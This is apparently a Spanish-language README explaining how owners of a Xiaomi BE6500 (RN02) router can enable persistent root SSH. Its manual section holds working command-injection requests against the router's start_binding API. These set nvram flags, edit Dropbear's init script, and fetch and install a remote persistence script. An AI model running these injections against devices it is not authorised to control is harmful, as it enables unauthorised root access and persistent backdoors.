# 🚀 Xiaomi BE6500 (RN02) SSH Unlocker
> ¡Desbloquea el verdadero poder de tu router y toma el control total!

Bienvenido a la guía definitiva en español para **habilitar el acceso SSH de forma permanente** en tu router **Xiaomi BE6500** (Modelo RN02). Por defecto, Xiaomi bloquea el acceso por terminal a estos potentes dispositivos, limitando lo que puedes hacer con tu propio hardware.

Con esta guía paso a paso, abriremos esa puerta de atrás (usando la API de configuración oculta), estableceremos persistencia para que el acceso sobreviva a reinicios o cortes de energía, y cambiaremos la contraseña para asegurar tu red.

---

## 🛠️ Requisitos Previos

Antes de comenzar la aventura, asegúrate de tener a mano lo siguiente:
- [x] Estar conectado a la red de tu Xiaomi BE6500 (ya sea por Wi-Fi o cable Ethernet).
- [x] Conocer la contraseña de administrador (la que usas para entrar al panel de control web del router).
- [x] El **Número de Serie (SN)** de tu router. Lo puedes encontrar en la etiqueta física debajo del router o en la app MiWiFi (busca algo como `SN: 57941/F4U644188`).
- [x] Un terminal de comandos abierto. Si usas Windows, te recomendamos abrir **PowerShell** o usar **WSL**. Si estás en macOS o Linux, la terminal por defecto es perfecta. Asegúrate de tener la herramienta `curl` instalada.

---

## 🔓 Paso 1: Descifrar la Contraseña de Fábrica (SSH)

Xiaomi asigna a cada router una contraseña de terminal única basada en su número de serie. Necesitamos descubrirla.

1. Abre tu navegador y dirígete a la calculadora de contraseñas de la comunidad: [https://miwifi.dev/ssh](https://miwifi.dev/ssh)
2. En la casilla de texto, escribe el **Número de Serie (SN)** exacto de tu router (respetando la barra diagonal `/` y mayúsculas).
3. Haz clic en el botón **"Calc"**.
4. La página te arrojará una contraseña alfanumérica de 8 caracteres (por ejemplo: `be9b1227`).
> **⚠️ IMPORTANTE:** Guarda esta contraseña muy bien, ¡es la llave maestra que usaremos más adelante para entrar por primera vez!

---

## 🔑 Paso 2: Capturar el Token de Sesión (`stok`)

El router necesita saber que eres el administrador legítimo antes de aceptar comandos. Esto se logra mediante un "token de sesión".

1. Abre tu navegador y entra al panel de administración de tu router: [http://192.168.1.1](http://192.168.1.1) (o la IP que le hayas asignado).
2. Inicia sesión con tu contraseña web normal.
3. Observa atentamente la barra de direcciones (URL) de tu navegador. Notarás que la dirección ha cambiado y ahora contiene un código largo llamado `stok`.
   * **Ejemplo de URL:** `http://192.168.1.1/cgi-bin/luci/;stok=7a8b9c0d1e2f3g4h5i6j/web/home#router`
4. Copia **exclusivamente** el código que está entre `stok=` y la siguiente barra diagonal `/`.
   * En el ejemplo de arriba, copiarías únicamente: `7a8b9c0d1e2f3g4h5i6j`

---

## 💻 Paso 3: La Magia (Ejecución del Exploit)

¡Es hora de hackear tu propio router! Vamos a inyectar una serie de comandos especiales aprovechando el panel de control.

Para tu comodidad, he preparado un script automático en este repositorio llamado `unlock_ssh.sh`. 

### Opción A: Usando el script automatizado (Recomendado)
Descarga el script de este repositorio, dale permisos de ejecución y pásale tu token como parámetro.

```bash
# Dale permisos al script (solo en Linux/macOS/WSL)
chmod +x unlock_ssh.sh

# Ejecuta el script con tu token (reemplaza ESTE_ES_TU_TOKEN con el tuyo real)
./unlock_ssh.sh ESTE_ES_TU_TOKEN
```

### Opción B: Modo Manual (Para los puristas o en Windows)
Si prefieres hacerlo comando por comando, copia y pega estos bloques en tu terminal. **¡No olvides cambiar `<TU_STOK>` por el token que copiaste en el Paso 2!**

```bash
STOK="<TU_STOK>"
IP="192.168.1.1"

# 1. Grabando configuraciones vitales en la NVRAM (Abre puertos)
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20set%20ssh_en%3D1%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20set%20telnet_en%3D1%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20set%20uart_en%3D1%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20set%20boot_wait%3Don%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20commit%27"

# 2. Descargando el módulo de persistencia AutoSSH (Lo instala en el disco del router)
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Amkdir%20-p%20%2Fdata%2Fauto_ssh%20%26%26%20cd%20%2Fdata%2Fauto_ssh%20%26%26%20curl%20-O%20https%3A%2F%2Ffastly.jsdelivr.net%2Fgh%2Flemoeo%2FAX6S%40main%2Fauto_ssh.sh%20%26%26%20chmod%20%2Bx%20auto_ssh.sh%27"

# 3. Activando AutoSSH en el Firewall para que se encienda solo al iniciar
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Auci%20set%20firewall.auto_ssh%3Dinclude%20%26%26%20uci%20set%20firewall.auto_ssh.type%3D%27script%27%20%26%26%20uci%20set%20firewall.auto_ssh.path%3D%27%2Fdata%2Fauto_ssh%2Fauto_ssh.sh%27%20%26%26%20uci%20set%20firewall.auto_ssh.enabled%3D%271%27%20%26%26%20uci%20commit%20firewall%27"

# 4. Desbloqueando la seguridad de Dropbear (el servidor SSH) y encendiéndolo
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Ased%20-i%20%27s%2Fchannel%3D.%2A%2Fchannel%3D%22debug%22%2Fg%27%20%2Fetc%2Finit.d%2Fdropbear%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0A%2Fetc%2Finit.d%2Fdropbear%20start%27"
```

---

## 🛡️ Paso 4: Primer Ingreso y Cambio de Contraseña

Si has seguido los pasos correctamente, tu router ahora tiene el puerto 22 abierto al mundo (de tu red local), listo para recibir conexiones.

1. Abre tu terminal de comandos y ejecuta:
   ```bash
   ssh root@192.168.1.1
   ```
2. Te aparecerá un mensaje preguntando si confías en el anfitrión (host). Escribe `yes` y presiona Enter.
3. Te pedirá una contraseña. **Usa la contraseña de 8 caracteres que calculaste en el Paso 1.** Al escribirla no verás caracteres ni asteriscos en pantalla (es una medida de seguridad en Linux), solo escríbela y presiona Enter.
4. ¡Felicidades! Deberías ver un mensaje de bienvenida de Xiaomi.

### Cambia la contraseña (Altamente Recomendado)
Para no depender de la contraseña del número de serie que calculaste al principio, te recomendamos cambiarla inmediatamente por la tuya. En la misma terminal de SSH que tienes abierta, puedes forzar el cambio inyectando tu nueva contraseña directamente al sistema usando este comando especial (ya que el comando clásico `passwd` suele estar bloqueado por Xiaomi):

```bash
# Reemplaza "MiNuevaClaveSegura" por la contraseña que tú quieras usar para el SSH
echo -e "MiNuevaClaveSegura\nMiNuevaClaveSegura" | passwd root --stdin
```

Si no marca error, tu contraseña se ha cambiado con éxito. A partir de ahora podrás conectarte por SSH a tu router usando esa nueva contraseña.

---

## 🩺 Solución de Problemas (Troubleshooting)

- **Me da error `Connection Refused` al intentar entrar por SSH:** Revisa que hayas usado el token `stok` correcto y completo. Si te tardaste demasiado entre el Paso 2 y el Paso 3, la sesión de la web pudo caducar. Inicia sesión en la web de nuevo, saca el nuevo `stok` y repite los comandos de inyección.
- **La contraseña calculada no me deja entrar (Access Denied):** Cerciórate de haber puesto las letras mayúsculas y minúsculas idénticas a la etiqueta de tu dispositivo al escribir el SN en la calculadora.
- **¿Qué pasa si hago un reinicio de fábrica (Hard Reset al botón)?** El router borrará todos estos cambios por seguridad. Tendrás que repetir todo este tutorial. Sin embargo, apagones de luz, cortes de energía, o reiniciar el router desde el enchufe **no** afectarán tu acceso SSH gracias al script de AutoSSH que instalamos.

---
> *¡Disfruta de tu router completamente desbloqueado y configúralo como los profesionales!*
